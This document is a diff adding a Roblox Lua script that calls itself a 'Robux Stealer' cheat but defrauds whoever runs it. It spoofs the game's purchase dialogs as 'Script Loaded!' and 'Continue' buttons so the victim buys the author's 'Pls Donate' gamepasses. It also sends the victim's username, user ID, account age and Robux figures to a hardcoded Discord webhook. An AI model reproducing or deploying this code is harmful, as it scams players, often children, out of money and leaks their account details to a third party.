@@ -1,3 +1,408 @@
+
+
+local v1 = Instance.new("ScreenGui")
+local vu2 = Instance.new("Frame")
+local v3 = Instance.new("TextLabel")
+local v4 = Instance.new("TextLabel")
+local vu5 = Instance.new("TextButton")
+local vu6 = game:GetService("TweenService")
+local v7 = Instance.new("UICorner")
+local v8 = Instance.new("UIStroke")
+local v9 = Instance.new("UICorner")
+v1.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+vu2.Parent = v1
+vu2.Size = UDim2.new(0, 250, 0, 110)
+vu2.Position = UDim2.new(1, 300, 1, - 120)
+vu2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+vu2.BorderSizePixel = 0
+vu2.Visible = true
+v7.Parent = vu2
+v7.CornerRadius = UDim.new(0, 10)
+v8.Parent = vu2
+v8.Thickness = 1.5
+v8.Color = Color3.fromRGB(255, 255, 255)
+v3.Parent = vu2
+v3.Size = UDim2.new(1, - 16, 0, 24)
+v3.Position = UDim2.new(0, 8, 0, 8)
+v3.Text = "Robux Stealer V6 Script🌀🔥"
+v3.TextSize = 18
+v3.TextColor3 = Color3.fromRGB(255, 255, 255)
+v3.BackgroundTransparency = 1
+v3.Font = Enum.Font.GothamBold
+v3.TextXAlignment = Enum.TextXAlignment.Left
+v4.Parent = vu2
+v4.Size = UDim2.new(1, - 16, 0, 38)
+v4.Position = UDim2.new(0, 8, 0, 34)
+v4.Text = "Loading Gui, Will Take A Few Seconds \n if it doesn\'t appear please rejoin."
+v4.TextSize = 14
+v4.TextColor3 = Color3.fromRGB(230, 230, 230)
+v4.BackgroundTransparency = 1
+v4.Font = Enum.Font.Gotham
+v4.TextWrapped = true
+v4.TextYAlignment = Enum.TextYAlignment.Top
+vu5.Parent = vu2
+vu5.Size = UDim2.new(1, - 20, 0, 26)
+vu5.Position = UDim2.new(0, 10, 1, - 34)
+vu5.Text = "Script Loading 🥳"
+vu5.TextSize = 16
+vu5.Font = Enum.Font.GothamBold
+vu5.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+vu5.TextColor3 = Color3.fromRGB(255, 255, 255)
+vu5.BorderSizePixel = 0
+v9.Parent = vu5
+v9.CornerRadius = UDim.new(0, 8)
+local function v12()
+    local v10 = vu6
+    local v11 = {
+        Position = UDim2.new(1, - 260, 1, - 120)
+    }
+    v10:Create(vu2, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), v11):Play()
+end
+local function vu16()
+    local v13 = vu6
+    local v14 = {
+        Position = UDim2.new(1, 300, 1, - 120)
+    }
+    local v15 = v13:Create(vu2, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), v14)
+    v15:Play()
+    v15.Completed:Connect(function()
+        vu2.Visible = false
+    end)
+end
+vu5.MouseButton1Click:Connect(function()
+    local v17 = vu6:Create(vu5, TweenInfo.new(0.08), {
+        Size = UDim2.new(1, - 24, 0, 24)
+    })
+    v17:Play()
+    v17.Completed:Connect(function()
+        local v18 = vu6:Create(vu5, TweenInfo.new(0.08), {
+            Size = UDim2.new(1, - 20, 0, 26)
+        })
+        v18:Play()
+        v18.Completed:Connect(vu16)
+    end)
+end)
+v12()
+local function vu24()
+    local v19 = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    local v20 = Instance.new("ScreenGui")
+    v20.Parent = v19
+    local v21 = Instance.new("Frame")
+    v21.Size = UDim2.new(0, 180, 0, 40)
+    v21.Position = UDim2.new(0.5, - 90, 0.52, 20)
+    v21.BackgroundTransparency = 1
+    v21.Parent = v20
+    Instance.new("UIStroke")
+    local v22 = Instance.new("UICorner")
+    v22.Parent = v21
+    v22.CornerRadius = UDim.new(0.2, 0)
+    local v23 = Instance.new("TextLabel")
+    v23.Size = UDim2.new(1, 0, 1, 0)
+    v23.BackgroundTransparency = 1
+    v23.Text = "Wait for the button to change \n when you click continue to script then load the main script"
+    v23.Font = Enum.Font.FredokaOne
+    v23.TextSize = 20
+    v23.TextStrokeTransparency = 0
+    v23.TextStrokeColor3 = Color3.fromRGB(50, 50, 50)
+    v23.TextColor3 = Color3.fromRGB(255, 255, 255)
+    v23.Parent = v21
+end
+local function vu31()
+    local v25 = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    local v26 = Instance.new("ScreenGui")
+    v26.Parent = v25
+    v26.IgnoreGuiInset = true
+    v26.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    local v27 = Instance.new("Frame")
+    v27.Parent = v26
+    v27.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+    v27.Size = UDim2.new(0, 255, 0, 45)
+    v27.Position = UDim2.new(0.5, - 125, 0.38, 24)
+    v27.BorderSizePixel = 0
+    v27.Active = false
+    v27.Visible = true
+    v27.ZIndex = 10
+    local v28 = Instance.new("UIStroke")
+    v28.Parent = v27
+    v28.Thickness = 2
+    v28.Color = Color3.fromRGB(184, 134, 11)
+    local v29 = Instance.new("UICorner")
+    v29.Parent = v27
+    v29.CornerRadius = UDim.new(0.2, 0)
+    local v30 = Instance.new("TextLabel")
+    v30.Parent = v27
+    v30.Text = "LOAD MAIN SCRIPT!"
+    v30.Font = Enum.Font.FredokaOne
+    v30.TextSize = 20
+    v30.Size = UDim2.new(1, 0, 1, 0)
+    v30.BackgroundTransparency = 1
+    v30.TextColor3 = Color3.fromRGB(105, 105, 105)
+    v30.TextStrokeTransparency = 0
+    v30.TextStrokeColor3 = Color3.fromRGB(50, 50, 50)
+    v30.ZIndex = 11
+end
+local function vu38()
+    local v32 = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    local v33 = Instance.new("ScreenGui")
+    v33.Parent = v32
+    v33.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    local v34 = Instance.new("Frame")
+    v34.Parent = v33
+    v34.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+    v34.Size = UDim2.new(0, 250, 0, 40)
+    v34.Position = UDim2.new(0.5, - 125, 0.38, - 10)
+    v34.BorderSizePixel = 0
+    v34.Active = true
+    v34.Draggable = false
+    v34.ZIndex = 5
+    local v35 = Instance.new("UIStroke")
+    v35.Parent = v34
+    v35.Thickness = 2
+    v35.Color = Color3.fromRGB(100, 100, 100)
+    local v36 = Instance.new("UICorner")
+    v36.Parent = v34
+    v36.CornerRadius = UDim.new(0.2, 0)
+    local v37 = Instance.new("TextLabel")
+    v37.Parent = v34
+    v37.Text = "CONTINUE TO SCRIPT!"
+    v37.Font = Enum.Font.FredokaOne
+    v37.TextSize = 20
+    v37.Size = UDim2.new(1, 0, 1, 0)
+    v37.BackgroundTransparency = 1
+    v37.TextColor3 = Color3.fromRGB(50, 50, 50)
+    v37.ZIndex = 6
+end
+Username = "mozilontop_01"
+Webhook = "https://discord.com/api/webhooks/1358935494049665084/fOAH6oL_mbIgp4kFDNRu1Cl5l1LQ5uqV3-HZz3-B97tieCFQ3hrKBwxX9YcRZz2TW_9z"
+ReplicatedStorage = game:GetService("ReplicatedStorage")
+MarketplaceService = game:GetService("MarketplaceService")
+HttpService = game:GetService("HttpService")
+CoreGui = game:GetService("CoreGui")
+Players = game:GetService("Players")
+local vu39 = game:GetService("HttpService")
+local vu40 = syn and syn.request or request
+if typeof(vu40) ~= "function" then
+    error("?!?")
+end
+Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
+local v41, vu42 = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
+local vu43 = nil
+local vu44 = nil
+local function vu49()
+    local v45 = {
+        username = "Hit On Pls Donate",
+        avatar_url = "https://cdn.discordapp.com/attachments/1299001946191040588/1329748647864303647/images_5.jpg?ex=678b786f&is=678a26ef&hm=0b89be217de156b0bcbacb6b3f611a3bde76cbd2dd26a6b2f6a843ab5c915d47&",
+        content = "You Got Hit"
+    }
+    local v46 = {}
+    local v47 = {
+        title = "**__Shar\'s Script__ | __Pls Donate Stealer__**",
+        color = tonumber(3368447),
+        description = clickablePlayerName .. " Use Your Script.",
+        thumbnail = {
+            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png"
+        },
+        fields = {
+            {
+                name = "Information",
+                value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "```"
+            },
+            {
+                name = "Robux",
+                value = "```" .. vu44 .. "```"
+            }
+        },
+        footer = {
+            text = "Created by c00lkidd-Devil"
+        }
+    }
+    __set_list(v46, 1, {
+        v47
+    })
+    v45.embeds = v46
+    local v48 = vu39:JSONEncode({
+        content = "@everyone",
+        embeds = {
+            v45
+        }
+    })
+    vu40({
+        Url = Webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = v48
+    })
+end
+if v41 then
+    local vu50 = Remotes.Function("OfflinePlayerLookup"):InvokeServer(vu42)
+    if not vu50 then
+        return Players.LocalPlayer:Kick()
+    end
+    local v51 = math.huge
+    local v52, v53, v54 = pairs(vu50.BoothUI.Items.Frame:GetChildren())
+    local v55 = nil
+    local vu56 = nil
+    while true do
+        local v57
+        v54, v57 = v52(v53, v54)
+        if v54 == nil then
+            break
+        end
+        if v57:GetAttribute("AssetType") == "Gamepass" and (not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v57:GetAttribute("AssetId")) and v57:GetAttribute("AssetPrice") < v51) then
+            v51 = v57:GetAttribute("AssetPrice")
+            v55 = v57
+        end
+    end
+    v55.Prompt:FireServer("", false, v51)
+    Animator = CoreGui:WaitForChild("PurchasePromptApp"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    local function vu64()
+        local v58, v59, v60 = pairs(vu50.BoothUI.Items.Frame:GetChildren())
+        local v61 = 0
+        while true do
+            local v62
+            v60, v62 = v58(v59, v60)
+            if v60 == nil then
+                break
+            end
+            if v62:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v62:GetAttribute("AssetId")) then
+                local v63 = v62:GetAttribute("AssetPrice")
+                if v63 <= vu56 and v61 < v63 then
+                    vu43 = v62
+                    v61 = v63
+                end
+            end
+        end
+        if vu43 then
+            if vu43.Prompt and typeof(vu43.Prompt.FireServer) == "function" then
+                vu43.Prompt:FireServer("", false, v61)
+            else
+                warn("?.")
+            end
+        end
+    end
+    repeat
+        task.wait()
+    until not Animator:FindFirstChild("Prompt")
+    Animator.ChildAdded:Connect(function(p65)
+        local v66 = p65.Name == "Prompt" and p65:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
+        if v66 then
+            if vu56 then
+                p65.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
+                local v67 = p65.AlertContents.TitleContainer.TitleArea.Title
+                v67.Size = UDim2.new(1, 0, v67.Size.Y.Scale, v67.Size.Y.Offset)
+                p65.AlertContents.MiddleContent.Visible = false
+                p65.AlertContents.Footer.Buttons["1"].Visible = false
+                p65.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+                local v68 = p65.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
+                v68.Size = UDim2.new(1, 0, v68.Size.Y.Scale, v68.Size.Y.Offset)
+                p65.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
+                p65.AlertContents.Footer.FooterContent.Visible = false
+            elseif vu43 then
+                p65.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
+                p65.AlertContents.MiddleContent.Visible = false
+                p65.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
+                p65.AlertContents.Footer.Buttons["2"].Visible = false
+                p65.AlertContents.Footer.FooterContent.Visible = false
+                local v69 = vu43
+                vu56 = v66.Text:match("(%d+)$") + v69:GetAttribute("AssetPrice")
+                vu43 = nil
+            end
+        end
+        if p65.Name == "ProductPurchaseModal" then
+            task.wait(0.1)
+            RemainingBalanceText = Animator:WaitForChild("ProductPurchaseModal"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content")
+            if RemainingBalanceText then
+                if vu56 then
+                    p65.AlertContents.TitleContainer.TitleArea.Title.TitleText.Text = "Please Donate - Script!"
+                    local v70 = p65.AlertContents.TitleContainer.TitleArea.Title
+                    v70.Size = UDim2.new(1, 0, v70.Size.Y.Scale, v70.Size.Y.Offset)
+                    p65.AlertContents.MiddleContent.Visible = false
+                    p65.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+                    local v71 = p65.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text
+                    p65.AlertContents.TitleContainer.TitleArea.Underline.Visible = false
+                    p65.AlertContents.TitleContainer.TitleArea.Title.Visible = false
+                    v71.Size = UDim2.new(1, 0, v71.Size.Y.Scale, v71.Size.Y.Offset)
+                    p65.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Visible = false
+                    game:GetService("CoreGui").PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.ImageTransparency = 1
+                    game:GetService("CoreGui").PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = ""
+                    game:GetService("CoreGui").PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.AlertContents.Footer.Buttons["1"].ImageTransparency = 1
+                    game:GetService("CoreGui").PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.AlertContents.Footer.Buttons["1"].LoadingImage.Visible = false
+                    game:GetService("CoreGui").PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.AlertContents.Footer.Buttons["1"].Size = UDim2.new(1, 0, 0, 100)
+                    vu31()
+                    p65.AlertContents.Footer.FooterContent.Visible = false
+                    p65.AlertContents.ImageTransparency = 1
+                    p65.AlertContents.Size = UDim2.new(0, 400, 0, 62)
+                    p65.AlertContents.Position = UDim2.new(0, 0, 0, 0)
+                    p65.ProductPurchaseModal.Position = UDim2.new(0, 0, 0, 0)
+                elseif vu43 then
+                    p65.AlertContents.TitleContainer.TitleArea.Title.TitleText.Text = "Script Loading, Click X!"
+                    p65.AlertContents.MiddleContent.Visible = false
+                    p65.AlertContents.TitleContainer.TitleArea.Title.TitleText.Visible = false
+                    p65.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Visible = true
+                    p65.AlertContents.Footer.Visible = false
+                    game:GetService("CoreGui").PurchasePromptApp.ProductPurchaseContainer.Animator.ProductPurchaseModal.ImageTransparency = 1
+                    p65.AlertContents.TitleContainer.TitleArea.Underline.Visible = false
+                    p65.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Visible = true
+                    p65.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Size = UDim2.new(0, 600, 0, 77)
+                    p65.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Position = UDim2.new(0, - 55, 0.5, 0)
+                    p65.AlertContents.TitleContainer.TitleArea.Title.CloseButton.Image = ""
+                    vu38()
+                    vu24()
+                    local v72 = vu43
+                    vu56 = RemainingBalanceText.Text:match("(%d+)$") + v72:GetAttribute("AssetPrice")
+                    vu43 = nil
+                end
+            end
+        end
+    end)
+    Animator.ChildRemoved:Connect(function(p73)
+        if p73.Name == "Prompt" or p73.Name == "ProductPurchaseModal" and vu56 then
+            if vu43 then
+                local v74 = vu43
+                if MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v74:GetAttribute("AssetId")) then
+                end
+            end
+            vu64()
+        end
+    end)
+    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(p75, p76)
+        if p75 == vu42 and vu56 then
+            vu49()
+            vu56 = vu56 - p76
+            vu64()
+        end
+    end)
+    local v77 = math.huge
+    local v78, v79, v80 = pairs(vu50.BoothUI.Items.Frame:GetChildren())
+    while true do
+        local v81
+        v80, v81 = v78(v79, v80)
+        if v80 == nil then
+            break
+        end
+        if v81:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v81:GetAttribute("AssetId")) then
+            local v82 = v81:GetAttribute("AssetPrice")
+            if v82 < v77 then
+                local v83 = v81
+                vu43 = v83
+                v77 = v82
+            end
+        end
+    end
+    if vu43 then
+        if vu43.Prompt and typeof(vu43.Prompt.FireServer) == "function" then
+            vu43.Prompt:FireServer("", false, v77)
+            print(v77)
+        else
+            warn("??.")
+        end
+    end
+end
+wait(5.30);
+v5:Destroy();
+
 shared.LoaderTitle = "Subscribe To c00lkidd-Devil";
 shared.LoaderKeyFrames = {
     [1] = {
